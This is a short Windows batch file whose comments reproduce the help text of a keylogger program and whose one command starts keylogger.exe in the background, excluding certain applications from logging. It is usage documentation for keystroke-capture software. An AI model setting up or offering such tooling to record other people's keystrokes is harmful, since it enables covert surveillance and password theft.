:: usage: keylogger.pyw [options]
:: 
:: options:
::   --version             show program's version number and exit
::   -h, --help            show this help message and exit
::   -f DIRNAME, --file=DIRNAME
::                         write log data to DIRNAME [default: C:\Temp\logdir]
::   -k, --keyboard        log keyboard input [default: True]
::   -a, --addlinefeed     add linefeed [\n] character when carriage return [\r]
::                         character is detected (for Notepad compatibility)
::                         [default: False]
::   -b, --parsebackspace  translate backspace chacarter into printable string
::                         [default: False]
::   -e, --parseescape     translate escape chacarter into printable string
::                         [default: False]
::   -x EXITKEY, --exitkey=EXITKEY
::                         specify the key to press to exit keylogger [default:
::                         F12]
::   -l FLUSHKEY, --flushkey=FLUSHKEY
::                         specify the key to press to flush write buffer to file
::                         [default: F11]
::   -d, --debug           debug mode (print output to console instead of the log
::                         file) [default: False]
::   -n NOLOG, --nolog=NOLOG
::                         specify an application by full path name whose input
::                         will not be logged. repeat option for multiple
::                         applications. [default: none]
::   -o ONEFILE, --onefile=ONEFILE
::                         log all output to one file ONEFILE, (inside DIRNAME,
::                         as specified with -f option), rather than to multiple
::                         files. [default: none]
::   -s SYSTEMLOG, --systemlog=SYSTEMLOG
::                         log all output, plus some debug output, to a SYSTEMLOG
::                         file (inside DIRNAME, as specified with -f option).
::                         [default: none]

@echo off

start keylogger.exe -n "C:\Program Files\Gaim\gaim.exe" -s "systemlog.txt" -n "C:\Program Files\IrfanView\i_view32.exe" -n "C:\Program Files\Adobe\Photoshop 7.0\Photoshop.exe"
